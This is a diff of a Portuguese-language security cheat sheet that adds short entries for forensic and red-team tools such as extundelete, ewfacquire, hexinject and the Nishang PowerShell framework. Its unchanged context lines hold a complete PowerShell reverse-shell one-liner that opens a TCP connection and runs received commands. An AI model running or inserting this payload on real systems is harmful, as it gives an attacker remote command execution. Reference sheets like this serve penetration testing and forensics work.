@@ -257,3 +257,33 @@ Get-ADComputer -Filter { OperatingSystem -notlike "Windows Server*" } -Propertie
 
 # Shell reversa:
 $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+# Procurar por arquivos executáveis sem extensão de executável:
+missidentify -r -a
+
+# Procurar por arquivos deletados, mas não sobreescritos.
+extundelete [args]
+
+# Recuperar dados em partição NTFS corrompida:
+scrounge-nfts [args]
+
+# Extrair dados de arquivo ou dispositivo e exportar em EWF
+# Info sobre o formato: https://www.loc.gov/preservation/digital/formats/fdd/fdd000406.shtml
+ewfacquire [args]
+
+# Sniffer de rede com possibilidade de injeção de dados em tempo real:
+hexinject [args]
+
+# Framework para análise de softwares criados em Java:
+javasnoop
+
+# Utilitário para comunicação serial (com emulação para protocolos antigos):
+minicom [args]
+
+# Extrair arquivos de imagens (de disco):
+# É parte do Sleuth Kit e do Autopsy:
+tsk_recover [args]
+
+# Framework com vários módulos para atividades de Red Team em powershell:
+# É possível usar via terminal. Para os scripts individuais, visite o repositório: https://github.com/samratashok/nishang
+nishang [args]
